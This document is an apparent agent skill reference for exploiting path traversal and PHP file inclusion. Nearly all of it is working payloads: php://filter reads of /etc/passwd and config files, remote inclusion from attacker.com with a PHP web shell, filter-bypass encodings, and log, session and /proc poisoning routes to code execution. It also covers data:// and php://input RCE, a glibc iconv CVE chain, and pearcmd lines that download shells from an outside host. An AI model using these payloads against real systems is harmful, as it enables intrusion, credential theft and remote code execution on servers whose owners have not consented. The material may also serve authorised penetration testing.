# path-traversal-lfi technical reference

For other original section numbers, use the [entry index](../SKILL.md#references).

## 5. PHP FILTER WRAPPER (FILE CONTENT READ)

Use `php://filter` to base64-encode file content to avoid null bytes, binary data:
```
?page=php://filter/convert.base64-encode/resource=config.php
?page=php://filter/convert.base64-encode/resource=/etc/passwd
?page=php://filter/read=string.rot13/resource=config.php
?page=php://filter/convert.iconv.UTF-8.UTF-16LE/resource=config.php
```
Decode the returned base64 to see the file contents (including PHP source code).

**Chain filters** (multiple transforms to bypass input filters):
```
?page=php://filter/convert.base64-encode|convert.base64-encode/resource=/etc/passwd
```

---

## 6. REMOTE FILE INCLUSION (RFI) — WHEN ENABLED

If PHP's `allow_url_include = On` (rare but exists):
```
?page=http://attacker.com/shell.txt
?page=ftp://attacker.com/shell.php
```
Host a `shell.txt` with `<?php system($_GET['cmd']); ?>`.

---

## 7. SERVER-SPECIFIC PATH TRUNCATION

PHP has a historical path length limit. Pad with `.` or `/./` to truncate appended extension:
```
?page=../../../../etc/passwd/./././././././././././............ (255+ chars)
```
When server appends `.php`, the truncation drops it.

Or null byte if PHP < 5.3.4:
```
?page=../../../../etc/passwd%00
```

---

## 8. PARAMETER LOCATIONS TO TEST

```
?file=        ?page=        ?include=    ?path=
?doc=         ?view=        ?load=       ?read=
?template=    ?lang=        ?url=        ?src=
?content=     ?site=        ?layout=     ?module=
```

Also test: HTTP headers, cookies, form `action` values, import/upload features.

---

## 9. FILTER BYPASS CHECKLIST

When `../` is stripped or blocked:

```
□ Try URL encoding: %2e%2e%2f
□ Try double URL encoding: %252e%252e%252f
□ Try overlong UTF-8: ..%c0%af / ..%ef%bc%8f
□ Try mixed: ..%2F or ..%5C (backslash on Linux)
□ Try redundant sequences: ....// or ..././ (strip once → still ../)
□ Try null byte: /../../../etc/passwd%00
□ Try absolute path: /etc/passwd (if no path prefix added)
□ Try Windows UNC (Windows server): \\127.0.0.1\C$\Windows\win.ini
```

---

## 10. IMPACT ESCALATION PATH

```
Path traversal (read arbitrary files)
├── Read /etc/passwd → enumerate users
├── Read /proc/self/environ → find API keys, DB passwords in env
├── Read app config files → find credentials → horizontal movement
├── Read SSH private keys → direct server login
└── Find log paths → Log Poisoning → LFI RCE

LFI (PHP code inclusion)
├── Log poisoning → webshell
├── Session file poisoning → webshell  
├── php://input → direct code execution
├── data:// → direct code execution
└── php://filter → read PHP source code → find more vulnerabilities
```

---

## 11. LFI TO RCE ESCALATION PATHS

| Method | Requirements | Payload |
|---|---|---|
| Log Poisoning (Apache) | LFI + Apache access.log readable | Inject `<?php system($_GET['c']);?>` in User-Agent → include `/var/log/apache2/access.log` |
| Log Poisoning (SSH) | LFI + SSH auth.log readable | SSH as `<?php system('id');?>@target` → include `/var/log/auth.log` |
| Log Poisoning (Mail) | LFI + mail log readable | Send email with PHP in subject → include `/var/log/mail.log` |
| /proc/self/fd bruteforce | LFI + Linux | Bruteforce `/proc/self/fd/0` through `/proc/self/fd/255` for open file handles containing injected content |
| /proc/self/environ | LFI + CGI/FastCGI | Inject PHP in `User-Agent` header → include `/proc/self/environ` |
| iconv CVE-2024-2961 | glibc < 2.39, PHP with `php://filter` | `php://filter/convert.iconv.UTF-8.ISO-2022-CN-EXT/resource=` chain to heap overflow → RCE. Tool: cnext-exploits |
| phpinfo() assisted | LFI + phpinfo page accessible | Race condition: upload tmp file via multipart to phpinfo → read tmp path from response → include before cleanup |
| PHP Session | LFI + session file writable | Inject PHP into session via controllable session variable → include `/tmp/sess_SESSIONID` or `/var/lib/php/sessions/sess_SESSIONID` |
| Upload race | LFI + upload endpoint | Upload PHP file → include before server-side validation/deletion |

---

## 12. PHP WRAPPER EXPLOITATION MATRIX

### php://filter (most powerful, always try first)

```text
php://filter/convert.base64-encode/resource=index.php
php://filter/read=string.rot13/resource=index.php
php://filter/convert.iconv.utf-8.utf-16/resource=index.php
php://filter/zlib.deflate/resource=index.php
```

**Filter chain RCE** (synacktiv php_filter_chain_generator):

- Chain multiple `convert.iconv` filters to write arbitrary bytes without file upload
- Tool: `synacktiv/php_filter_chain_generator` → generates chain that writes PHP code
- `python3 php_filter_chain_generator.py --chain '<?php system("id");?>'`

**convert.iconv + dechunk oracle** (blind file read):

- Tool: `synacktiv/php_filter_chains_oracle_exploit` (filters_chain_oracle_exploit)
- Enables blind LFI to read file contents character by character

### php://input

```text
POST vulnerable.php?page=php://input
Body: <?php system('id'); ?>
```

Requires `allow_url_include=On`

### data://

```text
data://text/plain,<?php system('id');?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
data:text/plain,<?php system('id');?>    ← note: no double slash variant also works
```

### phar://

```text
phar://uploaded.phar/test.php
```

Triggers deserialization of phar metadata → RCE via POP chain (requires file upload of crafted phar, can be disguised as JPEG)

### zip://

```text
zip://uploaded.zip%23shell.php
```

### expect://

```text
expect://id
```

Requires `expect` extension (rare)

---

## 13. PEARCMD LFI EXPLOITATION

When `pearcmd.php` is accessible via LFI (common in Docker PHP images):

| Method | Payload |
|---|---|
| config-create | `/?file=pearcmd.php&+config-create+/<?=phpinfo()?>+/tmp/shell.php` |
| man_dir | `/?file=pearcmd.php&+-c+/tmp/shell.php+-d+man_dir=<?=phpinfo()?>+-s+` |
| download | `/?file=pearcmd.php&+download+http://attacker.com/shell.php` |
| install | `/?file=pearcmd.php&+install+http://attacker.com/shell.tgz` |

---

## 14. WINDOWS-SPECIFIC LFI TECHNIQUES

**FindFirstFile wildcard** (Windows only):

- `<` matches any single character, `>` matches any sequence (similar to `?` and `*` but in file APIs)
- `php<<` can match `php5`, `phtml`, etc.
- `..\..\windows\win.ini` → use `<<` for fuzzy matching: `..\..\windows\win<<`

---

